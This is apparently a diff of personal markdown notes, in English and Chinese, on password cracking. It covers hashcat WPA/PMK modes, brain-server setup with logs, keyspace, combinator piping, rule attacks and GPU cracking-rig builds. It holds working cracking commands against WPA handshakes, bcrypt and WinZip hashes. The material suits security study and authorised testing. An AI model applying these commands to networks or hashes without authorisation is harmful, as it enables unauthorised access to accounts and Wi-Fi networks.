-The 256 Bit value derived by the PBKDF2 function using the SSID, Passphrase (PSK) as the differentiating factors used for authenticating between the AP and the Client. It will look like this:
-![the PMK (the Pairwise Master Key)](Aircrack-ng-Pairwise-master-key.jpg)
-Do some math.
-These are 32 HexaDecimal values, every HexaDecimal values takes 8 bit, so 32*8=256 Bit, which is the PMK i.e. 256-Bit key.
-We can also cross check this without cracking the key with aircrack-ng.
-By using wpa_passphrase command that comes pre-installed on almost every *nix distribution.
-Open terminal and type:
-`wpa_passphrase <SSID> <Passphrase>`
-`wpa_passphrase rootsh3ll iamrootsh3ll`
-We need to insert SSID along with Passphrase because as told earlier WPA2-PSK is SSID dependent, it changes completely with a slight change in SSID.
-Now, here's the output.
-![wpa_passphrase output](Wpa-passphrase-pmk-check-rootsh3ll.jpg)
-Compare the highlighted value with the value of Master Key above. Yes, it's exactly the same. So here is the confirmation that PMK we calculated and the PMK aircrack-ng calculated for a specific SSID and Passphrase is the same. Now we will see how to boost the speed.
+此外，它还支持散列模式16801，这样会跳过PMK的计算——正是该计算拖慢了WPA的破解速度。因NDA而无法将哈希值传输到远程破解装置时，预先计算PMK就会变得非常有用，这时可以在您的笔记本上运行hashcat。
+
+模式16801通常需要用到预先计算的PMK列表，其中为长度为64的十六进制编码串，作为输入词列表使用。为了预先计算PMK，可以使用hcxkeys工具。但是，hcxkeys工具需要用到ESSID，因此，我们需要提前从客户端请求ESSID。
 ### Pre-computing PMKs using CoWPAtty and Pyrit and Cracking
 #### Content of this chapter will go like this
 * Introduction
@@ -781,6 +1006,9 @@ To help other users to find a working adapter, please report your favourite adap
 * ALLNET ALL-WA0150N nice for portable operations
 * Alfa AWUS036H working, but too much power consumption
 * Alfa AWUS036NH working, but too much power consumption
+* ALFA AWUS036NHA (black) - Atheros AR9271
+* ALFA AWUS036H (grey) - Realtek RTL8187
+* ALFA AWUS036NH (green) - Ralink RT2870/RT3070
 Please keep in mind:
 Some VENDORs change the chipset, but keep the same product name. Make sure, that a supported chipset is inside!
 ### Introduction
@@ -914,6 +1142,112 @@ Here's the exact same attack, but using the new -S option to turn on slow candid
         ...
         Speed.#2.........:   361.3 kH/s (3.54ms)
 #### The Hashcat brain
+##### By running command
+Normally speaking, the hashcat brain server should have a large RAM.
+No need to add `-z` in the task command of hashtopolis.
+###### on the brain server side
+    `hashcat --brain-server --brain-port=13743`???
+    root@Helium-XR-01:~# hashcat --brain-server --brain-port=13743
+
+    1540763657.002542 | 0.00s | 0 | Generated authentication password: 78f581b2296937fb
+    1540763657.002943 | 0.00s | 0 | Brain server started
+    1540764152.164355 | 495.16s | 4 | Connection from xxx.yyy.xxx.yyy:53614
+    1540764152.487870 | 0.32s | 4 | Session: 0x7451768d, Attack: 0x99708c5b, Kernel-power: 64
+    1540764152.673725 | 0.19s | 4 | R | 0.06 ms | Offset: 0, Length: 64, Overlap: 0
+    1540764153.009471 | 0.34s | 4 | L | 0.04 ms | Long: 0, Inc: 64, New: 64
+    1540764656.023797 | 503.01s | 4 | Disconnected
+###### On the client side
+
+        hashcat --brain-client --brain-host=IP --brain-port=13743 --brain-password=78f581b2296937fb -m 3200 -a 0 /root/left_3200.txt /usr/share/wordlists/bcrypt_dic.txt 
+        Session..........: hashcat (Brain Session/Attack:0x7451768d/0x99708c5b)
+        Status...........: Quit
+        Hash.Type........: bcrypt $2*$, Blowfish (Unix)
+        Hash.Target......: /root/left_3200.txt
+        Time.Started.....: Sun Oct 28 23:02:31 2018 (8 mins, 24 secs)
+        Time.Estimated...: Sun Jun 7 00:16:20 2037 (22 days)
+        Guess.Base.......: File (/usr/share/wordlists/bcryt_dic.txt)
+        Guess.Queue......: 1/1 (100.00%)
+        Speed.#1.........: xxx kH/s (4.94ms) @ Accel:4 Loops:1 Thr:8 Vec:4
+        Recovered........: 0/506 (0.00%) Digests, 0/506 (0.00%) Salts
+        Progress.........: 6208/7258259316 (0.00%)
+        Rejected.........: 0/6208 (0.00%)
+        Brain.Link.#1....: N/A
+        Restore.Point....: 0/14344386 (0.00%)
+        Restore.Sub.#1...: Salt:97 Amplifier:0-1 Iteration:127-128
+        Candidates.#1....: 123456 -> charlie
+
+##### By configuring a service ??? service cannot be started
+###### On the brain server side
+* Cretated a "hashcat_brain_server.service" file in the directory /etc/systemd/system/:
+    `vim /etc/systemd/system/hashcat_brain_server.service`
+    [Unit]
+    Description= Start hashcat brain server
+    [Service]
+    Type=simple
+    ExecStart=/bin/bash -c "/usr/local/bin/hashcat --brain-server --brain-host=IP --brain-port=1374 --brain-password=password"
+    Restart=on-failure
+    [Install]
+    WantedBy=multi-user.target
+    Alias=hashcat-brain.service
+* reload the systemd daemon
+    `systemctl daemon-reload`
+* Check server with `netstat` or `ss` commands
+    
+        root@Helium-XR-01:~# netstat -antp
+        Active Internet connections (servers and established)
+        Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+        tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      666/apache2     
+        tcp        0      0 xxx.xxx.xxx.xxx:1374      0.0.0.0:*               LISTEN      32397/hashcat   
+        tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      627/mysqld      
+        tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      666/apache2     
+        ......    
+        tcp6       0      0 :::22                   :::*                    LISTEN      612/sshd 
+* Check service status:
+
+        root@Helium-XR-01:~# systemctl status hashcat-brain.service
+        ● hashcat_brain_server.service - Start hashcat brain server
+        Loaded: loaded (/etc/systemd/system/hashcat_brain_server.service; enabled; vendor preset: disabled)
+        Active: active (running) since Mon 2018-11-05 09:23:39 UTC; 21h ago
+         Main PID: 32397 (hashcat)
+        Memory: 2.7G
+        CGroup: /system.slice/hashcat_brain_server.service
+         └─32397 /usr/local/bin/hashcat --brain-server --brain-host=xxx.xxx.xxx.xxx --brain-port=1374 --brain-password=pasword
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.242933 | 0.00s |  -1 | Read 34688 bytes from attack 0xcbd4ae46 in 0.35 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.243136 | 0.00s |  -1 | Read 1264 bytes from attack 0x1a2fb5c0 in 0.19 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.243339 | 0.00s |  -1 | Read 16 bytes from attack 0x442d5481 in 0.19 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.243524 | 0.00s |  -1 | Read 1280 bytes from attack 0x77980c15 in 0.17 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.243808 | 0.00s |  -1 | Read 8896 bytes from attack 0x0ca746f1 in 0.27 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.244122 | 0.00s |  -1 | Read 11264 bytes from attack 0x9468c39d in 0.25 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.244306 | 0.00s |  -1 | Read 320 bytes from attack 0xd78528ce in 0.17 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.245787 | 0.00s |  -1 | Read 186320 bytes from attack 0xa7865a4f in 1.47 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.246027 | 0.00s |  -1 | Read 11632 bytes from attack 0x08434f8d in 0.23 ms
+        Nov 05 09:23:47 Helium-XR-01 bash[32397]: 1541409827.246507 | 0.00s |  -1 | Read 49632 bytes from attack 0x8fe3d3e4 in 0.47 ms
+* Check brain-server logs
+
+        root@Helium-XR-01:~# journalctl -u hashcat_brain_server
+        -- Logs begin at Thu 2018-11-01 12:50:29 UTC, end at Tue 2018-11-06 06:31:27 UTC. --
+        Nov 01 12:50:29 Helium-XR-01 bash[27864]: 1541076628.986307 | 0.00s | 4 | R |  0.06 ms | Offset: 806060, Length: 629, Overlap: 0
+        Nov 01 12:50:29 Helium-XR-01 bash[27864]: 1541076628.986639 | 0.00s | 4 | L |  0.18 ms | Long: 1361261, Inc: 518, New: 284
+        Nov 01 12:50:29 Helium-XR-01 bash[27864]: 1541076629.158441 | 0.17s | 4 | C |  0.11 ms | Attacks: 2
+        Nov 01 12:50:29 Helium-XR-01 bash[27864]: 1541076629.161942 | 0.00s | 4 | C |  3.48 ms | Hashes: 679
+        Nov 01 12:50:29 Helium-XR-01 bash[27864]: 1541076629.162074 | 0.00s | 4 | R |  0.09 ms | Offset: 806689, Length: 1024, Overlap: 0
+        Nov 01 12:50:29 Helium-XR-01 bash[27864]: 1541076629.162703 | 0.00s | 4 | L |  0.25 ms | Long: 1361940, Inc: 855, New: 435
+        Nov 01 12:50:29 Helium-XR-01 bash[27864]: 1541076629.163276 | 0.00s | 4 | R |  0.07 ms | Offset: 807713, Length: 589, Overlap: 0
+        Nov 01 12:50:30 Helium-XR-01 bash[27864]: 1541076629.163630 | 0.00s | 4 | L |  0.21 ms | Long: 1361940, Inc: 586, New: 298
+        Nov 01 12:50:30 Helium-XR-01 bash[27864]: 1541076629.349158 | 0.19s | 4 | C |  0.10 ms | Attacks: 2
+        Nov 01 12:50:30 Helium-XR-01 bash[27864]: 1541076629.352393 | 0.00s | 4 | C |  3.22 ms | Hashes: 733
+        Nov 01 12:50:30 Helium-XR-01 bash[27864]: 1541076629.353318 | 0.00s | 4 | R |  0.07 ms | Offset: 808302, Length: 1024, Overlap: 0
+        Nov 01 12:50:30 Helium-XR-01 bash[27864]: 1541076629.353811 | 0.00s | 4 | L |  0.28 ms | Long: 1362673, Inc: 1018, New: 506
+        Nov 01 12:50:30 Helium-XR-01 bash[27864]: 1541076629.354136 | 0.00s | 4 | R |  0.06 ms | Offset: 809326, Length: 518, Overlap: 0
+        Nov 01 12:50:30 Helium-XR-01 bash[27864]: 1541076629.354412 | 0.00s | 4 | L |  0.15 ms | Long: 1362673, Inc: 501, New: 249
+        Nov 01 12:50:30 Helium-XR-01 bash[27864]: 1541076629.549692 | 0.20s | 4 | C |  0.10 ms | Attacks: 2
+
+###### On the client side
+`hashcat --status -O -z --brain-host=IP of the hashcat-brain-server --brain-port=1374 --brain-password=password -m 3200 -a 0 hash.txt dictionary.txt -r rules.rule`
+
+#### 避免重复???
+* `-z`
+* Need a hashcat brain server
 ### need to be solved
   * install intel opencl sdk，速度太慢，查看hashcat硬件及驱动要求
       * Intel's OpenCL runtime (GPU only) is currently broken
@@ -1271,6 +1605,9 @@ root
 #### 基于掩码和字典配合的爆破模式 [Hybrid Mask + Wordlist]:
 `hashcat --force -m 0 hash.txt -1 ?l?d ?1?1?1?1 -a 7 dic1.txt dic2.txt`
 ![hybrid mask + wordlist](hybrid mask + wordlist.png)
+上面是分别对dic1.txt 和 dic2.txt分别加掩码，如果想用两个字典的组合加掩码，应该用下面的格式：
+`J:\hashcat-5.0.0>\hashcat-utils-1.9\bin\combinator.exe dic1 dic2 > dic1dic2 | hashcat64.exe --force -D 2 -a 7 ?d dic1dic2 --stdout`
+这样可以避免上传两个字典的组合文件，当然如果组合文件不大的话也可以组合好后生成字典文件然后上传。
 #### 基于increment的自动变长模式,下面的意思就表示自动破解4到8位由小写子目录和数字组成的密码hash:
 `hashcat --force -a 3 -m 0 hash.txt --increment --increment-min=4 increment-max=8 -1 ?l?d`
 ![increment](increment.png)
@@ -1292,6 +1629,13 @@ Again, mind the syntax. This assumes that the base64.rule file is in a subdirect
 #### 破解 WinZip压缩文件密码hash:
 `hashcat --force -m 13600 hash.txt -a 3 ?d?d?d?d?d?d`
 ### Rule-based Attack
+Note: You cannot do `-a 1` with `-r` in combination. What I meant is more like this:`$ ./combinator.bin words.dict words.dict | ./hashcat -m -a 0 -r rules.rule`
+#### rule attacking on words which length is less than 8
+ I'm trying the WPA/WPA2 cracking, but unfortunately all the words that are less than 8 characters are getting rejected, since the minimum length of WPA passwords are 8 characters.
+ The problem is that I'm trying with a rule based attack which adds characters to the original word, so the end result is 8 characteres long, but hashcat only checkes the original word.
+word + rule: ^0^0^0^0 results in: "0000word" but still gets rejected.
+Not a bug, it's a feature! Really, you can use hashcat in --stdout mode and pipe it to another hashcat session in stdin mode. Then it will work. Something like this:
+`$ ./hashcat wordlist.txt -r rule.txt | ./hashcat -m 2500 mywpa.hccap -w 3`
 #### Description
 The rule-based attack is one of the most complicated of all the attack modes. The reason or this is very simple. The rule-based attack is like a programming language designed for password candidate generation. It has functions to modify, cut or extend words and has conditional operators to skip some, etc. That makes it the most flexible, accurate and efficient attack.
 #### Why not stick to regular expressions
@@ -1580,7 +1924,7 @@ Here are some example commands to enable you to generate common rules locally on
         mp64.exe -1 0123456789 "d$?1$?1$?1" -o Double-Word-Suffix-0-999.rule
 * Paste them into a text file and name it "Hashcat Rule Generator.cmd".
 * Place this new file in the same directory as maskprocessor and double left click it.
-* Sometimes `mp64.bin` cannot work perfectly. It is because `$` should be escaped as `\$` in Ubuntu (no need to be escaped in Windows). And there is every one `\$` before one character.
+* Sometimes `mp64.bin` cannot work perfectly. It is because `$` should be escaped as `\$` in Ubuntu (no need to be escaped in Windows). And there is every `\$` before one character.
     * `./maskprocessor-0.73/mp64.bin -1 456789 -2 0123456789 "\$?1\$?2" -o append_19years.rule`
         `J:\hashcat-5.0.0>hashcat64.exe -D 2 -a 0 1.txt -r append_19years.rule --stdout > 19years.txt`
     * `./maskprocessor-0.73/mp64.bin -1 456789 -2 0123456789 "\$1\$9\$?1\$?2" -o append_19+years.rule`
@@ -1777,6 +2121,7 @@ Command line|Example|Description
 Note: Use `--force` with the command.
 ### Benchmark
 `hashcat --benchmark`
+`hashcat -b -m 2500`
 This will take a while as Hashcat can crack a wide variety of hash types. What benchmark does is it will simulate a quick session which each of the types of hash it can handle. After each session/hash type Hashcat will display the results in the terminal. Set your results aside for comparison when it’s done. In the meantime lets fire up the same thing on our EC2 instance.
 Keep in mind the following when comparing:
 
@@ -1807,8 +2152,11 @@ Keep in mind the following when comparing:
         mastertoor
 
 Pipe to hashcat:
-
-        J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator.exe dic1 dic2 | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx
+        `J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator.exe dic1 dic2 | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx` (This will not work as expected.)
+This program is a stand-alone implementation of the Combinator Attack.
+Each word from file2 is appended to each word from file1 and then printed to STDOUT.
+Since the program is required to rewind the files multiple times it cannot work with STDIN and requires real files.
+Another option would be to store all the content from both files in memory. However in hash-cracking we usually work with huge files, resulting in a requirement that the size of the files we use does matter.
 #### combinator3
 
         cdutboy@ubuntu:/mnt/hgfs/J/hashcat-5.0.0$ cat dic1
@@ -1835,6 +2183,66 @@ Pipe to hashcat:
 Pipe to hashcat:
 
         J:\hashcat-5.0.0>hashcat-utils-1.9\bin\combinator3.exe dic1 dic2 dic3 | hashcat64.exe --force -d 3 -m 2500 -a 0 J:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx
+### keyspace
+Keyspace is the term used to refer to the number of possible combinations for a specified attack. In hashcat, it has a special meaning that is not exactly the same as the usual meaning. The output of `--keyspace` is designed to be used to distribute cracking, i.e. you can use the value from `--keyspace` and divide it into x chunks (best would be if the chunk size depends on the performance of your individual nodes if they are different) and use the `-s/-l` parameters for distributed cracking.
+To tell devices which candidates to generate on GPU, hashcat keeps track of some of the candidates on the host. To do this, there are two loops: a loop that runs on the host (the "base loop"), and a loop that runs on the device (the "mod(ifier) loop.")
+To work between multiple compute nodes, hashcat must divide up and distribute portions of the base loop. This is where `--keyspace`, `-s`, and `-l` come to play. `--keyspace` reports the size of the base loop that executes on the host so that we know how to divide up the work. `-s` and `-l` control the start/stop positions of the base loop.
+In other words, **hashcat's `keyspace` is specially designed to optimize distribution of work, and is not a literal representation of the total possible keyspace for a given attack.**
+**hashcat**
+* `-a 0`- number of words in wordlist
+* `-a 0 + rules`- number of words in wordlist
+* `-a 1`- number of words of the larger words list out of the 2 word lists specified (left_wordlist, right_wordlist)
+* `-a 3`- multiply the number of possible characters in each mask position for the base loop mask, excluding the mod loop mask - please just use `--keyspace` switch :)
+* `-a 6`- number of words in wordlist
+* `-a 7`- number of words in wordlist
+You can calculate the keyspace for a specific attack with the following syntax:
+`$ ./hashcat64.bin -m 0 -a 0 example dict -r rules/best64.rule --keyspace`
+`129988`
+
+        ./hashcat64.bin --force -m 2500 TP-LINK_54AA-01.hccapx -a 1 shengmu.txt shengmu.txt
+
+        Dictionary cache hit:
+        * Filename..: shengmu.txt
+        * Passwords.: 99300
+        * Bytes.....: 506216
+        * Keyspace..: 9860490000
+99300*99300=9860490000
+### about pipe???
+* `|` can only work for `-a 0` (straight) mode
+* `mkfifo blah` cannot work for `-a 0` (straight) mode or `-a 6` (hybrid dic+mask) mode either.
+    * when using `mkfifo blah` on `-a 1` or `-a 7` mode will get the `Not a regular file` error.???
+* use `|` as much as possible, not `mkfifo blah`
+* `mkfifo` can only work as expected for `combinator.bin`, not for `hashcat64.bin`.
+    
+
+        ubuntu@ip-172-31-88-33:~/hashcat-5.0.0$ rm blah && mkfifo blah && ./hashcat-utils-1.9/bin/combinator.bin dic1 dic2 > blah | ./hashcat-utils-1.9/bin/combinator.bin blah dic3
+        dic11dic21dic31
+        dic11dic21dic32
+        dic11dic21dic33
+        dic11dic22dic31
+        dic11dic22dic32
+        dic11dic22dic33
+        dic11dic23dic31
+        dic11dic23dic32
+        dic11dic23dic33
+        dic12dic21dic31
+        dic12dic21dic32
+        dic12dic21dic33
+        dic12dic22dic31
+        dic12dic22dic32
+        dic12dic22dic33
+        dic12dic23dic31
+        dic12dic23dic32
+        dic12dic23dic33
+        dic13dic21dic31
+        dic13dic21dic32
+        dic13dic21dic33
+        dic13dic22dic31
+        dic13dic22dic32
+        dic13dic22dic33
+        dic13dic23dic31
+        dic13dic23dic32
+        dic13dic23dic33
 ## mdk3 <a name=mkd3></a>
 ### installation
 * 首先获取源代码
@@ -1926,12 +2334,14 @@ PC可以容易看到 FakeAP，但是 Android 的 WLAN 扫描不容易看到，�
               -t <bssid>               #用bssid检测AP的信息
               -s <pps>                #速率，默认300
               -b <character set>              #设置字符集
+
 ## Building my own cracking box
+
 I could build my own cracking box and plenty of people have done that only run you a few thousand dollars. Roughly speaking to build a decent GPU based cracking box let's say it's going to cost you thousand dollars per box plus roughly five hundred dollars per GPU, really depends on what GPU you decide to purchase and there's different GPUs that crack passwords at different rates and it is not really what they're designed for cracking but they're designed for graphical intents purposes and it just so happens they work really well for cracking passwords.
 So if I was building my own box as I mentioned it cost me a few thousand dollars I mean really depends like a through 8 GPUs in it and increase the cost by four thousand dollars but it's only on perform about eight times faster than a machine with on GPU in it. To do this though I need a beefy power supply. These types of machines suck up a lot of power so I need really good cooling. The CPU and RAM are not very important for these types of purposes so so if you're building machine there's no real reason to max it out with the highest and CPU with multiple cores and a tremendous amount of RAM. And you probably if you're going to build a machine would probably want to put more than one GPU in it but but you could always start off with one GPU and if you need it to you could add additional GPUs as long as you have the right slots for doing that. 
 Nvidia Tesla cards in AWS EC2 instance are very very expensive GPU cards and unfortunately they're not optimized for doing a password cracking but they're designed for doing things like financial modeling and very high-end things that require floating-point mathematics that are not important for password cracking. So that's the only option they have available and so that's what I utilized. If you're building your own box you would want not to use those cards. I think they run probably around two or three thousand dollars a piece when Amazon launched a service a couple years ago that was substantially more expensive than that, but they're going to perform at a less effective rate than a five-hundred-dollar card you can buy commercially. So do not buy an nvidia tesla card for password cracking.
 The most important piece of hardware you need to crack passwords is a fast GPU. Because cracking passwords is like mining Bitcoins, you can get a good idea of how your GPU would perform by how well it would mine Bitcoins.
-This site provides a good list of available video cards and describes their performance: https://en.bitcoin.it/wiki/Mining_hardware_comparison. When you look at that site, what you'll notice is that AMD GPUs tend to be much faster than NVIDIA GPUs, even though for gaming often the reverse is true. The reason for this is explained in detail in the explanation of why a GPU mines faster than a CPU, but in short, AMD GPUs tackle the problem of graphics rending with a lot of small, simple chips that perform 32-bit operations quickly. NVIDIA GPUs have fewer, but more sophisticated chips that are closer to a CPU in complexity. For the purposes of Bitcoin mining or password cracking, which can be highly parallel, those larger number of simple chips work the fastest. Also note that cracking software can take advantage of multiple GPUs, so if you can afford it, and your motherboard can support it, you may find you'll get the same performance out of two cheaper GPUs than a single expensive one.
+This site provides a good list of available video cards and describes their performance: https://en.bitcoin.it/wiki/Mining_hardware_comparison. When you look at that site, what you'll notice is that **AMD GPUs tend to be much faster than NVIDIA GPUs**, even though for gaming often the reverse is true. The reason for this is explained in detail in the explanation of why a GPU mines faster than a CPU, but in short, AMD GPUs tackle the problem of graphics rending with a lot of small, simple chips that perform 32-bit operations quickly. NVIDIA GPUs have fewer, but more sophisticated chips that are closer to a CPU in complexity. For the purposes of Bitcoin mining or password cracking, which can be highly parallel, those larger number of simple chips work the fastest. Also note that cracking software can take advantage of multiple GPUs, so if you can afford it, and your motherboard can support it, you may find **you'll get the same performance out of two cheaper GPUs than a single expensive one**.
 In my case, I didn't have a desktop PC lying around I could use for this, so I built a special desktop just for password cracking. In case you want to follow in my footsteps, here is my exact hardware along with prices:
 
 * GPU: SAPPHIRE FleX 100312FLEX Radeon HD 6950 2GB: $280
@@ -1944,9 +2354,283 @@ In my case, I didn't have a desktop PC lying around I could use for this, so I b
 * Total: $760, $930 with monitor, $340 just GPU + PS
 If you already have a desktop that supports a modern video card, you may need to purchase only the GPU and power supply. Keep in mind that modern high-performance video cards require a lot of power, so you'll want at least a 700W power supply in your case, and more than that if you intend to chain two video cards together. I found that the AMD 6950 had good performance for my budget, plus this particular model can theoretically be turned into a 6970 with a firmware update. If you have a larger budget though, you may want to buy two or more 6950s and chain them together.
 So there you have it. You now have a month to get your hardware together, and next, I'll discuss the software side of password cracking, explain dictionary, brute-force and mask attacks, and give specific examples with my password-cracking system.
+### Choosing GPU
+![hashrates of GPUs comparison](hashrates_of_gpus.xlsx)
+
+GPU|hashrates|hashrates|hashrates(K)|price of a new one|yuan/K|price of used|yuan/K
+--|--|--|--|--|--|--|--
+Nvidia GTX 1080Ti|576000 hash/s|576000|576K|11000|19.0972222222222|4500|7.8125
+GeForce GTX titan XP|520000 hash/s|520000|520K|11000|21.1538461538462||0
+**rx vega**||410000|410K|2700|6.58536585365854||
+Nvidia GTX 1080|396800 hash/s|396800|396.8K||0|2899|7.30594758064516
+Radeon R9 295 x2|347000 hash/s|347000|347K||0||0
+GeForce GTX 1070|285000 hash/s|285000|285K||0|2000|7.01754385964912
+GeForce GTX titan X|279000 hash/s|279000|279K||0||0
+GeForce GTX 980 Ti|240000 hash/s|240000|240K||0||0
+Radeon RX 580|224000 hash/s|224000|224K|1500|6.69642857142857|900|4.01785714285714
+Radeon R9 390X|200000 hash/s|200000|200K||0||
+GeForce GTX 980|200000 hash/s|200000|200K||0||
+GeForce GTX titan Z|188000 hash/s|188000|188K||0||
+Radeon RX 480|185000 hash/s|185000|185K||0||
+
+The targeted workloads of the different cards are not the same across AMD and NVIDIA. Traditionally, NVIDIA has spent a much stronger effort on optimizing floating point operations and arithmetic while AMD put a stronger focus on integers and bitwise operations. This has lead to the commonality of NVIDIA being better for various scientific calculations and AMD being better for general cryptography. Recent changes in architectures (on both sides) have been closing that gap.
+* If you can, go for NVidia
+    HashCats Support for NVidia is much better, especially with Linux (what would have been my favorite combination).
+* If you go for AMD, prepare for trouble
+* (whatever you get, make sure its a founders edition. Sometimes called a reference card/edition)
+### Tips
+* And a decent cooling system is required to keep them operating at peak performance. Liquid cooling is good.
+* i7? Need to function as a PC as well, so not to choose a too low level CPU. Or an appropriate AMD CPU?
+* A good option is to buy a gaming motherboard.
+* Also note that most open-air frames will require the use of risers in order to work (more on this later.)
+* For the low cost of jumper switches, it's worth just buying a few of these.
+* risers
+    * if you are looking for absolute maximum performance then don't use risers.
+    * I've actually had some really good experience with USB3-based PCIe risers.
+    * For PCIe 1.0 this is not a problem, and in most cases PCIe 2.0 should also work fairly well. PCIe 3.0 and newer, however, may decide to hate you something fierce if you use risers. (This will be especially true with USB3-based risers, as USB3 is not capable at transmitting at PCIe 3.0 bus speeds.)
+        Fortunately, some of the better modern BIOS you will find (like the ones on gaming motherboards) should allow you to set the speed of your PCIe bus and downgrade it to an earlier spec. This option will be specific to each BIOS, so consult your documentation for precise steps. Once you drop the speed of the bus, however, running with good quality risers should be no problem.
+    * 16GB RAM
+RAM is cheap, buy as much as you can afford and fit in your motherboard
+    * Intel i5 or i7 CPU
+You're not gaining much performance by going to the i7, but if you got a little extra $$, go for it.
+* Note that the mother board should support the SSD: M.2 SSD, SATA M.2 and so on.
+### Hardware List
+#### [One Hardware list](https://ethicalhackingblog.com/building-a-password-cracking-machine-with-5-gpu/)
+Name|Description|Price(Prices may change over the time)|Link
+--|--|--|--
+CPU|Intel Core i5-7500 LGA 1151 7th Gen Core Desktop Processor (BX80677I57500)|188 USD|On Amazon
+RAM|Ballistix Sport LT 8GB Single DDR4 2666 MT/s (PC4-21300) SR x8 DIMM 288-Pin Memory - BLS8G4D26BFSEK (Red)|87 USD|On Amazon
+Harddisk|DREVO X1 Series 120GB SSD 2.5-inch Solid State Drive SATA3 Read 550M/S Write 400M/S|55 USD|On Amazon
+Motherboard|MSI Pro Series Intel Z270 DDR4 HDMI USB 3 SLI ATX Motherboard (Z270 SLI PLUS)|125 USD|On Amazon
+PSU|EVGA SuperNOVA 1000 G3, 80 Plus Gold 1000W, Fully Modular, Eco Mode with New HDB Fan, 10 Year Warranty, Includes Power ON Self Tester, Compact 150mm Size, Power Supply 220-G3-1000-X1|190 USD|On Amazon
+VGA Cards|EVGA GeForce GTX 1060 SC GAMING, ACX 2.0 (Single Fan), 6GB GDDR5, DX12 OSD Support (PXOC), Only 6.8 Inches Graphics Card 06G-P4-6163-KR|260 USD|On Amazon
+Power Switch|SoundOriginal Refit Desktop Computer Case Motherboard Power Supply Reset HDD Button Switch (63inch 160cm)|9 USD|On Amazon
+Rig|A Rig for 8 GPUs (bought from Amazon but is out of stock)|130 USD|N/A
+PCIE Risers|YIKESHU 6 Pack PCIe PCI-E 16x 8x 4x 1x Powered Riser Adapter CardCard w/ 60cm USB 3.0 Extension Cable & 6 Pin PCI-E to SATA Power Cable - GPU Riser Adapter Extender Cable - Ethereum Mining ETH|40 USD|On Amazon
+Screws|VAPKER PC Computer Screws Standoffs Set Assortment Kit|20 USD|On Amazon
+Power Meter|RioRand Plug Power Meter Socket Energy Watt Voltage Amps Meter with Backlight Reduce Your Energy Costs|17 USD|On Amazon
+Tweezers|PIXNOR Tweezers 7-Piece Precision ESD Anti-Static Stainless Steel Tweezers for Electronics|8 USD|On Amazon
+
+#### Another list
+1 x SuperMicro SYS-7048GR-TR 4U Server with X10DRG-Q Motherboard = $1,989.99 (NewEgg)
+2 x Intel Xeon E5-2620 v3 2.4 GHz LGA 2011-3 85W = $469.98 (Ebay)
+4 x Nvidia GTX 1070 Founders Edition = $1,737.14 (Jet.com)
+2 x Samsung 850 Pro 512GB SATA3 SSD = $412.24 (Jet.com)
+4 x Kingston Server ValueRAM DDR4 2133MHz 16GB = $391.96 (NewEgg)
+TOTAL = $5001.31
+![hash cracking rig with 4 Nvidia GPUs](hashcracking_rig_with_4gpus.webp)
+
+#### [Another list](https://www.blackhillsinfosec.com/build-password-cracker-nvidia-gtx-1080ti-gtx-1070/)
+ASUS X99-E WS/USB 3.1 LGA 2011-v3 Intel X99 SATA 6Gb/s USB 3.1 USB 3.0 CEB Intel Motherboard
+QTY 1: $515
+https://www.newegg.com/Product/Product.aspx?Item=N82E16813182968
+EVGA GeForce GTX 1080 Ti FE DirectX 12 11G-P4-6390-KR
+QTY 4 @ $700 ~$2800
+https://www.newegg.com/Product/Product.aspx?Item=N82E16814487335
+Intel Core i7-6800K Broadwell-E 6-Core 3.4 GHz LGA 2011-v3 140W BX80671I76800K Desktop Processor
+QTY 1: $440
+https://www.newegg.com/Product/Product.aspx?Item=N82E16819117649
+G.SKILL TridentZ Series 64GB (4 x 16GB) 288-Pin DDR4 SDRAM DDR4 3200 (PC4 25600) Intel X99 Platform Desktop Memory Model F4-3200C16Q-64GTZKO
+QTY 1: $509
+https://www.newegg.com/Product/Product.aspx?Item=N82E16820232331
+MasterAir Pro 4 CPU Air Cooler with Continuous Direct Contact Technology 2.0 by Cooler Master
+QTY 1: $46 **
+https://www.newegg.com/Product/Product.aspx?Item=N82E16835103229
+Athena Power RM-4U8G525 Black SGCC (T=1.2mm) 4U Rackmount Server Case 2 External 5.25″ Drive Bays – OEM
+QTY 1: $250
+https://www.newegg.com/Product/Product.aspx?Item=N82E16811192442
+Rosewill 1600W Modular Gaming Power Supply, Continuous @ 50 Degree C, 80 PLUS GOLD Certified, SLI & CrossFire Ready – HERCULES-1600S
+QTY 1: $350
+https://www.newegg.com/Product/Product.aspx?Item=N82E16817182251
+SAMSUNG 850 EVO 2.5″ 500GB SATA III 3-D Vertical Internal Solid State Drive (SSD) MZ-75E500B/AM
+QTY 1: $200 **
+https://www.newegg.com/Product/Product.aspx?Item=N82E16820147373
+Total for new password cracking machine
+$5110
+### [Install the drivers](https://www.unix-ninja.com/p/Building_a_Password_Cracking_Rig_for_Hashcat_-_Part_III)
+I am going to cover the steps for installing both AMD and NVIDIA drivers for completeness, however I would strongly encourage you to use NVIDIA cards in your builds. The AMD drivers are essentially garbage.
+#### set BIOS
+* download the latest BIOS driver
+* press F7 into advanced mode, and then click M-flash to update BIOS
+* 4g memory/crpto currency mining to enable
+* Super IO configuration
+    * COM to disable
+    * LPT port to disable
+ Ensure to enable in BIOS PCIe/Above 4G Decoding
+#### Installing Ubuntu
+Boot install Ubuntu from USB. Once complete proceed:
